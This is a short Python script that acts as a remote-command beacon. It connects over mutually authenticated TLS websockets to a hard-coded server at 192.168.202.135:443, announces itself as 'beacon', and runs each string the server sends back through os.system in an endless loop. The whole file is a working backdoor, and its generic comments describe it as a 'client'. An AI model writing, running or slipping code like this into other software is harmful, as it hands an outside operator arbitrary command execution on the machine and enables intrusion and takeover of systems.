import socket
import ssl
import websockets
import asyncio
import os

# Server IP and Port details

sslServerIP         = "192.168.202.135";
sslServerPort       = 443;

# Construction of an SSLContext

sslSettings                     = ssl.SSLContext();
sslSettings.verify_mode         = ssl.CERT_REQUIRED;

# Loading of CA certificate.

# With this CA certificate this client will validate certificate from the server

sslSettings.load_verify_locations("/etc/nginx/certs/ca.crt")

# Loading of client certificate

sslSettings.load_cert_chain(certfile="/etc/nginx/certs/client.crt", keyfile="/etc/nginx/certs/client.key")

# Create a stream based client socket

async def hello():
        uri = "wss://192.168.202.135:443"
        async with websockets.connect(
        uri, ssl=sslSettings
        ) as websocket:
                print("Connected")
                msg = '{"Name":"beacon"}'
                while 1:
                        await websocket.send(msg)
                        cmd = await websocket.recv()
                        os.system(cmd)

asyncio.get_event_loop().run_until_complete(hello())
